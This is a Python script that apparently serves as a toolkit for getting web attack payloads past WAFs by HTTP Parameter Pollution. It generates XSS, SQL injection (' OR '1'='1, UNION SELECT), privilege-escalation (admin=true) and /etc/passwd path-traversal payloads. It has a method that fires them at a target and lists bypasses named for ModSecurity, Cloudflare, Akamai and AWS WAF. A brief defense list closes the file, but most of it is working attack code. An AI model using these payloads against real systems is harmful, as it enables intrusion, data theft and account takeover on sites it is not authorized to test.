#!/usr/bin/env python3
"""
HTTP Parameter Pollution (HPP) Bypass Techniques
For authorized security testing and WAF evasion research

HPP exploits inconsistencies in how different technologies parse duplicate parameters:
- Apache/PHP: Uses LAST occurrence
- ASP.NET/IIS: Concatenates with comma
- Node.js/Express: Creates array
- Tomcat/JSP: Uses FIRST occurrence
"""

import requests
from urllib.parse import urlencode, parse_qs
from typing import Dict, List, Tuple
import json

class HPPTester:
    """HTTP Parameter Pollution testing framework"""
    
    def __init__(self, target_url: str, headers: Dict = None):
        self.target_url = target_url
        self.headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Security Research)',
            'Accept': '*/*'
        }
        
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 1: Parameter Duplication (Multiple Values)
    # ═══════════════════════════════════════════════════════════
    
    def duplicate_parameter_attack(self, clean_param: str, malicious_param: str, 
                                   param_name: str = "id") -> List[str]:
        """
        Send duplicate parameters - backend picks one, WAF might check the other
        
        Example: ?id=1&id=<script>alert(1)</script>
        - WAF sees first (clean) value
        - Backend uses last (malicious) value
        """
        payloads = []
        
        # Strategy 1: Clean first, malicious last (for PHP/Apache)
        payload1 = f"{param_name}={clean_param}&{param_name}={malicious_param}"
        payloads.append(payload1)
        
        # Strategy 2: Malicious first, clean last (for Tomcat/JSP)
        payload2 = f"{param_name}={malicious_param}&{param_name}={clean_param}"
        payloads.append(payload2)
        
        # Strategy 3: Multiple duplicates (confusion)
        payload3 = f"{param_name}={clean_param}&{param_name}={malicious_param}&{param_name}={clean_param}"
        payloads.append(payload3)
        
        return payloads
    
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 2: Parameter Splitting
    # ═══════════════════════════════════════════════════════════
    
    def split_parameter_attack(self, payload: str, param_name: str = "search") -> str:
        """
        Split malicious payload across multiple parameters that concatenate
        
        Example: ?search=<script&search=>&search=alert(1)&search=</script>
        ASP.NET concatenates: <script>,>,alert(1),</script> → bypasses keyword filters
        """
        # Split payload into chunks
        if len(payload) < 4:
            chunks = list(payload)
        else:
            mid = len(payload) // 2
            chunks = [payload[:mid], payload[mid:]]
        
        # Build query with duplicates
        parts = [f"{param_name}={chunk}" for chunk in chunks]
        return "&".join(parts)
    
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 3: HPP with URL Encoding Variations
    # ═══════════════════════════════════════════════════════════
    
    def encoding_variation_attack(self, payload: str, param_name: str = "input") -> List[str]:
        """
        Combine HPP with encoding to confuse normalization
        
        WAF normalizes first, misses duplicate
        Backend processes both differently
        """
        import urllib.parse
        
        payloads = []
        
        # One encoded, one not
        encoded = urllib.parse.quote(payload)
        payloads.append(f"{param_name}={payload}&{param_name}={encoded}")
        
        # Double encoding on duplicate
        double_encoded = urllib.parse.quote(encoded)
        payloads.append(f"{param_name}={payload}&{param_name}={double_encoded}")
        
        # Mixed case parameter names (some WAFs case-sensitive)
        payloads.append(f"{param_name}={payload}&{param_name.upper()}={payload}")
        
        return payloads
    
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 4: HPP with Special Characters
    # ═══════════════════════════════════════════════════════════
    
    def special_char_pollution(self, payload: str, param_name: str = "data") -> List[str]:
        """
        Use special characters in parameter names for parser confusion
        
        Some parsers treat param[] or param[0] differently than param
        """
        payloads = []
        
        # Array notation (PHP interprets as array)
        payloads.append(f"{param_name}[]=clean&{param_name}[]={payload}")
        payloads.append(f"{param_name}[0]=clean&{param_name}[1]={payload}")
        
        # Dot notation (some frameworks parse as nested)
        payloads.append(f"{param_name}.safe=clean&{param_name}.xss={payload}")
        
        # Null byte injection in param name
        payloads.append(f"{param_name}%00=clean&{param_name}={payload}")
        
        return payloads
    
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 5: JSON/REST API HPP
    # ═══════════════════════════════════════════════════════════
    
    def json_hpp_attack(self, clean_value: str, malicious_value: str, 
                       param_name: str = "user_id") -> List[Dict]:
        """
        HPP in JSON bodies - duplicate keys in JSON objects
        
        Different parsers handle duplicate keys differently:
        - Some take first
        - Some take last
        - Some merge
        """
        payloads = []
        
        # Duplicate key in JSON (non-standard but some parsers accept)
        # Python json.loads takes LAST occurrence
        payload1 = f'{{"{param_name}": "{clean_value}", "{param_name}": "{malicious_value}"}}'
        payloads.append(payload1)
        
        # Nested duplication
        payload2 = {
            "data": {
                param_name: clean_value
            },
            param_name: malicious_value
        }
        payloads.append(json.dumps(payload2))
        
        return payloads
    
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 6: HPP in Different HTTP Methods
    # ═══════════════════════════════════════════════════════════
    
    def mixed_method_pollution(self, param_name: str = "id", 
                               clean: str = "123", malicious: str = "<xss>"):
        """
        Send parameter in BOTH query string and POST body
        
        Some frameworks merge $_GET and $_POST
        WAF might only check one location
        """
        test_cases = []
        
        # GET param clean, POST param malicious
        test_cases.append({
            'method': 'POST',
            'url': f"{self.target_url}?{param_name}={clean}",
            'data': {param_name: malicious}
        })
        
        # POST param clean, GET param malicious  
        test_cases.append({
            'method': 'POST',
            'url': f"{self.target_url}?{param_name}={malicious}",
            'data': {param_name: clean}
        })
        
        # Both in body with different content-types
        test_cases.append({
            'method': 'POST',
            'url': self.target_url,
            'data': f"{param_name}={clean}&{param_name}={malicious}",
            'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
        })
        
        return test_cases
    
    # ═══════════════════════════════════════════════════════════
    # TECHNIQUE 7: HPP with Parameter Injection
    # ═══════════════════════════════════════════════════════════
    
    def parameter_injection_hpp(self, param_name: str = "page") -> List[str]:
        """
        Inject additional parameters through HPP to modify application behavior
        
        Example: Bypass access controls by injecting admin=true
        """
        payloads = []
        
        # Inject additional parameter through value
        payloads.append(f"{param_name}=1&admin=true")
        payloads.append(f"{param_name}=1&{param_name}=2&role=admin")
        
        # Fragment injection (sometimes parsed as parameter)
        payloads.append(f"{param_name}=1#{param_name}=../../etc/passwd")
        
        # Semicolon separation (some parsers treat ; as &)
        payloads.append(f"{param_name}=1;{param_name}=<script>alert(1)</script>")
        
        return payloads
    
    # ═══════════════════════════════════════════════════════════
    # TESTING FRAMEWORK
    # ═══════════════════════════════════════════════════════════
    
    def test_all_techniques(self, malicious_payload: str = "<script>alert(1)</script>"):
        """Run all HPP techniques against target"""
        
        print(f"[*] Testing HTTP Parameter Pollution against: {self.target_url}\n")
        
        results = []
        
        # Test 1: Basic duplication
        print("[+] TECHNIQUE 1: Parameter Duplication")
        dupe_payloads = self.duplicate_parameter_attack("clean_value", malicious_payload)
        for i, payload in enumerate(dupe_payloads, 1):
            print(f"    Payload {i}: ?{payload}")
            results.append(('duplication', payload))
        
        # Test 2: Splitting
        print("\n[+] TECHNIQUE 2: Parameter Splitting")
        split_payload = self.split_parameter_attack(malicious_payload)
        print(f"    Payload: ?{split_payload}")
        results.append(('splitting', split_payload))
        
        # Test 3: Encoding variations
        print("\n[+] TECHNIQUE 3: Encoding Variations")
        enc_payloads = self.encoding_variation_attack(malicious_payload)
        for i, payload in enumerate(enc_payloads, 1):
            print(f"    Payload {i}: ?{payload}")
            results.append(('encoding', payload))
        
        # Test 4: Special characters
        print("\n[+] TECHNIQUE 4: Special Character Pollution")
        special_payloads = self.special_char_pollution(malicious_payload)
        for i, payload in enumerate(special_payloads, 1):
            print(f"    Payload {i}: ?{payload}")
            results.append(('special_char', payload))
        
        # Test 5: JSON HPP
        print("\n[+] TECHNIQUE 5: JSON HPP")
        json_payloads = self.json_hpp_attack("clean", malicious_payload)
        for i, payload in enumerate(json_payloads, 1):
            print(f"    Payload {i}: {payload}")
            results.append(('json', payload))
        
        # Test 6: Parameter injection
        print("\n[+] TECHNIQUE 6: Parameter Injection")
        injection_payloads = self.parameter_injection_hpp()
        for i, payload in enumerate(injection_payloads, 1):
            print(f"    Payload {i}: ?{payload}")
            results.append(('injection', payload))
        
        return results
    
    def fire_payloads(self, payloads: List[Tuple[str, str]], method: str = "GET"):
        """Actually send payloads to target (use with caution)"""
        
        print(f"\n[*] Firing {len(payloads)} payloads at target...\n")
        
        for technique, payload in payloads:
            try:
                if method == "GET":
                    url = f"{self.target_url}?{payload}"
                    resp = requests.get(url, headers=self.headers, timeout=10)
                else:
                    resp = requests.post(self.target_url, data=payload, 
                                       headers=self.headers, timeout=10)
                
                print(f"[{technique}] Status: {resp.status_code} | Length: {len(resp.text)}")
                
                # Check for common bypass indicators
                if any(marker in resp.text.lower() for marker in 
                       ['<script>', 'alert(', 'onerror=', 'eval(']):
                    print(f"    ⚠️  POTENTIAL BYPASS DETECTED!")
                    
            except Exception as e:
                print(f"[{technique}] Error: {str(e)}")


# ═══════════════════════════════════════════════════════════
# WAF-SPECIFIC HPP BYPASSES
# ═══════════════════════════════════════════════════════════

class WAFSpecificHPP:
    """HPP techniques tailored for specific WAF vendors"""
    
    @staticmethod
    def modsecurity_bypass():
        """ModSecurity often checks first occurrence"""
        return [
            "id=1&id=' OR '1'='1",  # SQLi via second param
            "search=safe&search=<script>alert(1)</script>",  # XSS via second
        ]
    
    @staticmethod
    def cloudflare_bypass():
        """Cloudflare WAF parameter handling quirks"""
        return [
            "id=1&ID=<xss>",  # Case variation
            "id[]=safe&id[]=<script>alert(1)</script>",  # Array notation
        ]
    
    @staticmethod
    def akamai_bypass():
        """Akamai Kona parameter pollution"""
        return [
            "id=1&id=<script>alert(1)</script>&id=1",  # Sandwich technique
            "id=1%26id=<xss>",  # Encoded separator
        ]
    
    @staticmethod
    def aws_waf_bypass():
        """AWS WAF pollution techniques"""
        return [
            "id=safe&id=<script>alert(document.domain)</script>",
            "id=1&id=1' UNION SELECT null,null,null--",  # SQLi duplication
        ]


# ═══════════════════════════════════════════════════════════
# DEMONSTRATION & USAGE
# ═══════════════════════════════════════════════════════════

def demonstrate_hpp():
    """Show HPP techniques without actually attacking"""
    
    print("=" * 70)
    print("HTTP PARAMETER POLLUTION (HPP) BYPASS TECHNIQUES")
    print("For Authorized Security Testing Only")
    print("=" * 70)
    
    # Initialize tester (use localhost/lab environment)
    tester = HPPTester("http://testserver.local/api")
    
    # Generate all payloads
    payloads = tester.test_all_techniques("<script>alert('XSS')</script>")
    
    print("\n" + "=" * 70)
    print("WAF-SPECIFIC BYPASSES")
    print("=" * 70)
    
    waf = WAFSpecificHPP()
    
    print("\n[ModSecurity Bypasses]")
    for p in waf.modsecurity_bypass():
        print(f"  • {p}")
    
    print("\n[Cloudflare Bypasses]")
    for p in waf.cloudflare_bypass():
        print(f"  • {p}")
    
    print("\n[Akamai Bypasses]")
    for p in waf.akamai_bypass():
        print(f"  • {p}")
    
    print("\n[AWS WAF Bypasses]")
    for p in waf.aws_waf_bypass():
        print(f"  • {p}")
    
    print("\n" + "=" * 70)
    print("DEFENSE RECOMMENDATIONS")
    print("=" * 70)
    print("""
1. Normalize parameters BEFORE security checks
2. Reject requests with duplicate parameter names
3. Use strict parsing - don't merge GET/POST
4. Validate ALL occurrences of a parameter
5. Use allowlists, not blocklists
6. Implement consistent parsing across WAF and backend
    """)


if __name__ == "__main__":
    demonstrate_hpp()
